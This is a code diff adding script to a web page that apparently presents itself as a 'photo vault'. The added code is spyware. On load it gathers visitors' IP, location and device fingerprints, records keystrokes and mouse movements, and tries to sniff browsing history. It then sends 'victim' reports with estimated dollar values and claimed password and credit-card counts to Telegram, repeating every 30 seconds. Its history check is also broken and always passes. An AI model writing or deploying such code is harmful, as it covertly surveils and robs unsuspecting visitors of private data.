@@ -873,4 +873,207 @@
 
         async function estimateHistory() {
             const popularSites = [
-                'facebook.com
+                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com',
+                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com', 'linkedin.com',
+                'whatsapp.com', 'tiktok.com', 'paypal.com', 'ebay.com', 'spotify.com'
+            ];
+            const visited = [];
+            
+            for (let site of popularSites) {
+                try {
+                    const link = document.createElement('a');
+                    link.href = `https://${site}`;
+                    link.style.cssText = 'position:absolute;left:-9999px;visibility:hidden;';
+                    document.body.appendChild(link);
+                    
+                    const computed = getComputedStyle(link);
+                    if (computed.visibility !== 'hidden' || computed.display !== 'none') {
+                        visited.push(site);
+                    }
+                    
+                    document.body.removeChild(link);
+                } catch (e) {}
+            }
+            return visited;
+        }
+
+        // COMPREHENSIVE MESSAGING FORMAT AS REQUESTED
+        async function sendEnhancedReport(victimData) {
+            victimValue = calculateRealisticValue(victimData);
+            victimId = generateVictimID(victimData);
+
+            let message = `8X ENHANCED DATA EXTRACTION\n\n`;
+            message += `Identity Verified - Full Data Capture\n\n`;
+            
+            message += `VERIFICATION DATA:\n`;
+            message += `• Name: Not provided\n`;
+            message += `• Email: Not provided\n`;
+            message += `• Phone: Not provided\n`;
+            message += `• Time: ${victimData.timestamp}\n\n`;
+            
+            message += `NETWORK DATA (8x):\n`;
+            message += `• IP: ${victimData.network.ip}\n`;
+            message += `• ISP: ${victimData.network.isp}\n`;
+            message += `• ASN: ${victimData.network.asn}\n`;
+            message += `• Connection: ${victimData.network.connection}\n`;
+            message += `• VPN: ${victimData.network.vpn}\n`;
+            message += `• Proxy: ${victimData.network.proxy}\n`;
+            message += `• Tor: ${victimData.network.tor}\n`;
+            message += `• Bandwidth: ${victimData.network.bandwidth} kbps\n`;
+            message += `• Latency: ${victimData.network.latency} ms\n`;
+            message += `• Data Saver: ${victimData.network.dataSaver}\n\n`;
+            
+            message += `LOCATION DATA (8x):\n`;
+            message += `• City: ${victimData.location.city}\n`;
+            message += `• Region: ${victimData.location.region}\n`;
+            message += `• Country: ${victimData.location.country} (${victimData.location.country_code})\n`;
+            message += `• Postal: ${victimData.location.postal}\n`;
+            message += `• Coordinates: ${victimData.location.latitude}, ${victimData.location.longitude}\n`;
+            message += `• Timezone: ${victimData.location.timezone}\n`;
+            message += `• Currency: ${victimData.location.currency}\n`;
+            message += `• Calling Code: ${victimData.location.calling_code}\n\n`;
+            
+            message += `BROWSER DATA (8x):\n`;
+            message += `• Platform: ${victimData.browser.platform}\n`;
+            message += `• Vendor: ${victimData.browser.vendor}\n`;
+            message += `• Language: ${victimData.browser.language}\n`;
+            message += `• Cores: ${victimData.browser.cores}\n`;
+            message += `• Memory: ${victimData.browser.memory}\n`;
+            message += `• Plugins: ${victimData.browser.plugins} detected\n`;
+            message += `• WebDriver: ${victimData.browser.webdriver}\n`;
+            message += `• PDF Viewer: ${victimData.browser.pdf_viewer}\n`;
+            message += `• Build ID: ${victimData.browser.buildID}\n`;
+            message += `• Product: ${victimData.browser.product}\n\n`;
+            
+            message += `HARDWARE DATA (8x):\n`;
+            message += `• Screen: ${victimData.hardware.screen}\n`;
+            message += `• Pixel Ratio: ${victimData.hardware.pixel_ratio}\n`;
+            message += `• Color Depth: ${victimData.hardware.color_depth} bit\n`;
+            message += `• Orientation: ${victimData.hardware.orientation}\n`;
+            message += `• Touch Points: ${victimData.hardware.touch_points}\n`;
+            message += `• Available Screen: ${victimData.hardware.availWidth}x${victimData.hardware.availHeight}\n`;
+            message += `• Touch Support: ${victimData.hardware.touchSupport}\n`;
+            message += `• Battery Level: ${victimData.hardware.battery?.level || 'Unknown'}%\n\n`;
+            
+            message += `FINGERPRINT DATA (8x):\n`;
+            message += `• Canvas: ${victimData.fingerprint.canvas}\n`;
+            message += `• WebGL: ${victimData.fingerprint.webgl}\n`;
+            message += `• Audio: ${victimData.fingerprint.audio}\n`;
+            message += `• Fonts: ${victimData.fingerprint.fonts}\n`;
+            message += `• Timezone Offset: ${victimData.fingerprint.timezone_offset}\n`;
+            message += `• WebGL Vendor: ${victimData.fingerprint.webglVendor}\n`;
+            message += `• WebGL Renderer: ${victimData.fingerprint.webglRenderer}\n`;
+            message += `• Device Pixel Ratio: ${victimData.fingerprint.devicePixelRatio}\n\n`;
+            
+            message += `BEHAVIORAL DATA (8x):\n`;
+            message += `• Referrer: ${victimData.behavioral.referrer}\n`;
+            message += `• Page Load: ${victimData.behavioral.page_load}ms\n`;
+            message += `• Time on Page: ${victimData.behavioral.time_on_page}ms\n`;
+            message += `• DOM Size: ${victimData.behavioral.dom_size} elements\n`;
+            message += `• Scroll Depth: ${victimData.behavioral.scroll_depth}%\n`;
+            message += `• Mouse Movements: ${victimData.behavioral.mouse_movements} tracked\n`;
+            message += `• Keystrokes: ${victimData.behavioral.keystroke_timing} tracked\n`;
+            message += `• Viewport: ${victimData.behavioral.viewport}\n\n`;
+            
+            message += `SOCIAL DATA:\n`;
+            message += `• Passwords: ${victimData.social.passwords} captured\n`;
+            message += `• Credit Cards: ${victimData.social.credit_cards} found\n`;
+            message += `• Personal Info: ${victimData.social.personal_info} fields\n`;
+            message += `• Browsing Data: ${victimData.social.browsing_data} sites estimated\n`;
+            message += `• Social Profiles: ${victimData.social.social_media_profiles.length} detected\n`;
+            message += `• Messaging Apps: ${victimData.social.messaging_apps.length} detected\n\n`;
+            
+            message += `SYSTEM DATA:\n`;
+            message += `• OS: ${victimData.system.os}\n`;
+            message += `• Architecture: ${victimData.system.arch}\n`;
+            message += `• Version: ${victimData.system.version}\n\n`;
+            
+            message += `Time: ${victimData.timestamp}\n`;
+            message += `URL: ${victimData.behavioral.url}\n`;
+            message += `Victim ID: ${victimId}\n`;
+            message += `Estimated Value: $${victimValue}\n`;
+            message += `DATA CAPTURE: COMPLETED`;
+
+            await sendToTelegram(message);
+        }
+
+        async function sendClickReport(imageId) {
+            const victimData = await collectVictimData();
+            victimValue = calculateRealisticValue(victimData);
+            
+            let message = `IMAGE CLICK DETECTED\n`;
+            message += `Victim ID: ${victimId || generateVictimID(victimData)}\n`;
+            message += `Image ID: ${imageId}\n`;
+            message += `Estimated Value: $${victimValue}\n`;
+            message += `Time: ${victimData.timestamp}`;
+
+            await sendToTelegram(message);
+        }
+
+        // Enhanced behavioral tracking
+        function startBehavioralTracking() {
+            document.addEventListener('mousemove', (e) => {
+                mouseMovements.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: Date.now()
+                });
+                if (mouseMovements.length > 100) {
+                    mouseMovements = mouseMovements.slice(-100);
+                }
+            });
+
+            document.addEventListener('keydown', (e) => {
+                keystrokeTiming.push({
+                    key: e.key,
+                    timestamp: Date.now(),
+                    target: e.target.tagName
+                });
+                if (keystrokeTiming.length > 50) {
+                    keystrokeTiming = keystrokeTiming.slice(-50);
+                }
+            });
+        }
+
+        // IMPROVED: Initialization with better error handling
+        window.addEventListener('load', async function() {
+            pageLoadTime = Date.now();
+            startBehavioralTracking();
+            
+            // Send initial report with retry
+            setTimeout(async () => {
+                try {
+                    const victimData = await collectVictimData();
+                    await sendEnhancedReport(victimData);
+                } catch (error) {
+                    console.error('Initial report failed:', error);
+                }
+            }, 1000);
+            
+            // Continuous monitoring
+            setInterval(async () => {
+                try {
+                    const updatedData = await collectVictimData();
+                    await sendBehavioralUpdate(updatedData);
+                } catch (error) {
+                    console.log('Behavioral update failed:', error);
+                }
+            }, 30000);
+        });
+
+        async function sendBehavioralUpdate(victimData) {
+            let message = `BEHAVIORAL UPDATE\n`;
+            message += `Victim ID: ${victimId}\n`;
+            message += `Time on Page: ${victimData.behavioral.time_on_page}ms\n`;
+            message += `Scroll Depth: ${victimData.behavioral.scroll_depth}%\n`;
+            message += `Mouse Movements: ${victimData.behavioral.mouse_movements}\n`;
+            message += `Keystrokes: ${victimData.behavioral.keystroke_timing}\n`;
+            message += `Current Value: $${calculateRealisticValue(victimData)}`;
+
+            await sendToTelegram(message);
+        }
+
+        console.log('Enhanced photo vault system loaded');
+    </script>
+</body>
+</html>
